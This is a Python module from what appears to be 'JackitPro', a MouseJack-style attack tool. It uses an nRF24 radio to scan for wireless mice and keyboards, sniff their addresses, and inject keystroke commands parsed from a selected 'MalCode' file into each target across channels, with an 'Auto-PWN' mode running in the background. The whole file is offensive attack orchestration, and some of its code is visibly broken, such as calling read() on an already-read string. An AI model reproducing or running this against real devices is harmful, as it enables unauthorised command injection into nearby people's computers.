from six import iteritems
import multiprocessing
from JackitPro.Mapper.Parser import Parser

OPTIONS_STATE = {
    "Auto-PWN": True,
    "All-Channels": False,
    "Snipe": False,
    "MalCode": False,
    "Scan": False,
    "Confirm": False
}


class MJ_PM():
    def __init__(self, nrf24, running, selected_malcode_file, current_key):
        self.nrf24 = nrf24
        self.process = None
        self.running = running
        self.current_key = current_key
        self.option_state = OPTIONS_STATE
        self.selected_file_content = None
        self.selected_malcode_file = selected_malcode_file

    def activate(self, targets):
        self.process = multiprocessing.Process(
            target=self.mousejack_backend,
            args=targets
        )
        self.process.start()

    def deactivate(self):
        self.process.terminate()
        self.process.join()

    def set_option_state(self, option, state):
        self.option_state[option] = state

    def mousejack_backend(self, targets):
        while self.running:
            if self.option_state["Auto-PWN"]:
                if self.option_state["Scan"]:
                    self.scan_backend()
                elif self.option_state["Confirm"]:
                    self.attack_backend(targets)

    def process_selected_file(self, filename):
        self.selected_malcode_file = f"./MalCode/{filename}"
        with open(f"JackitPro/MalCode/{filename}", 'r') as file:
            self.selected_file_content = file.read()

    def scan_backend(self):
        self.nrf24.scan()

    def attack_backend(self, targets):
        if self.selected_file_content is not None:
            parser = Parser(self.selected_file_content.read())
            mal_command = parser.parse()

            for address, target in iteritems(targets):
                payload = target['payload']
                channels = target['channels']
                address = target['address']
                hid = target['device']

                self.nrf24.sniffer_mode(address)

                if hid:
                    for channel in channels:
                        self.nrf24.set_channel(channel)
                        self.nrf24.attack(hid(address, payload), mal_command)
